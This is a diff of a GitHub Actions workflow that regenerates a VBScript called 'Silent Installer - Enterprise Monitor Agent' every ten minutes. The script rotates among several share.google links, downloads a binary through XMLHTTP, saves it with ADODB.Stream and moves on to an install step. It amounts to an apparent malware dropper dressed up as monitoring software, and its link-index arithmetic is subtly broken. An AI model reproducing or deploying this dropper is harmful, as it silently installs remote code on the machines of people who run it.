@@ -2,7 +2,7 @@ name: Update VBS
 
 on:
   schedule:
-    - cron: '*/50 * * * *'
+    - cron: '*/10 * * * *'
   workflow_dispatch:
 
 jobs:
@@ -15,17 +15,17 @@ jobs:
       uses: actions/checkout@v4
     - name: Create VBS file
       run: |
-        # Define your links (REPLACE WITH YOUR ACTUAL LINKS)
+        # Define your links
         links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
         
         # Get current link based on 10-minute interval
         current_minute=$(date +%M)
-        link_index=$((current_minute / 50 % 5))
+        link_index=$((current_minute / 10 % 10))
         current_link=${links[$link_index]}
         
         echo "Creating VBS with link: $current_link"
         
-        # Create the VBS file using echo commands
+        # Create the VBS file using echo commands with your exact code
         echo "' --------------------------------------------------------------------------" > installer.vbs
         echo "'  Silent Installer - Enterprise Monitor Agent" >> installer.vbs
         echo "' --------------------------------------------------------------------------" >> installer.vbs
@@ -50,10 +50,10 @@ jobs:
         echo "If objXMLHTTP.Status = 200 Then" >> installer.vbs
         echo "    Set objADOStream = CreateObject(\"ADODB.Stream\")" >> installer.vbs
         echo "    objADOStream.Open" >> installer.vbs
-        echo "    objADOStream.Type = 1" >> installer.vbs
+        echo "    objADOStream.Type = 1 ' Binary" >> installer.vbs
         echo "    objADOStream.Write objXMLHTTP.ResponseBody" >> installer.vbs
         echo "    objADOStream.Position = 0" >> installer.vbs
-        echo "    objADOStream.SaveToFile strFile, 2" >> installer.vbs
+        echo "    objADOStream.SaveToFile strFile, 2 ' Overwrite" >> installer.vbs
         echo "    objADOStream.Close" >> installer.vbs
         echo "" >> installer.vbs
         echo "    ' Install" >> installer.vbs
